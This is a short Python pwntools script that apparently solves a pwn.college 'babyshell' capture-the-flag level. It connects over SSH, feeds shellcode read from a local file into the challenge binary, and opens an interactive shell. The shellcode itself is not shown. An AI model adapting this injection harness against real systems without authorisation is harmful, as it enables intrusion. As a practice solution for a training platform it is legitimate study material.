#!/usr/bin/env python

import argparse
from pwn import *


context(arch="amd64", os="linux", log_level="info")
# TODO: Make the SSH/Remote option configurable, and make all of this configurable
CHALLENGE_PATH = "/challenge/babyshell_level1"
SSH_CREDENTIALS = {
    "user": "hacker",
    "host": "pwn.college",
    "keyfile": "/home/shiki/.ssh/id_rsa.pub",
}

# TODO: This should be received in a configuration file
INPUT_TRIGGER = "bytes from stdin"


class Exploit:
    def __init__(
        self, process: pwnlib.tubes.process.process, payload: bytes, input_trigger: str
    ):
        self._process = process
        self._payload = payload
        self._input_trigger = input_trigger

    def run(self) -> str:
        self._process.recvuntil(self._input_trigger)
        self._process.sendline(self._payload)
        self._process.interactive()


def init_pwn(ssh_credentials, challenge_path) -> pwnlib.tubes.process.process:
    shell = ssh(**ssh_credentials)
    return shell.process(challenge_path)


def build_payload(parts: list) -> bytes:
    return b"".join(parts)


def assemble_shellcode(target=None, filename="shellcode") -> bytes:
    with open(f"{filename}-raw", "rb") as f:
        return f.read()


def parse_arguments():
    parser = argparse.ArgumentParser(description="Parse command line arguments")
    # TODO: I doubt this is an ideal way of doing this
    parser.add_argument('-s', '--shellcode-source', type=str, help='The path to the shellcode source file, excluding the suffix')
    args = parser.parse_args()
    return args


def main():
    args = parse_arguments()
    shellcode = assemble_shellcode(filename=args.shellcode_source)
    payload_parts = [shellcode, b"\n"]
    payload = build_payload(payload_parts)
    remote_process = init_pwn(SSH_CREDENTIALS, CHALLENGE_PATH)
    exploit = Exploit(remote_process, payload, INPUT_TRIGGER)
    exploit.run()


if __name__ == "__main__":
    main()

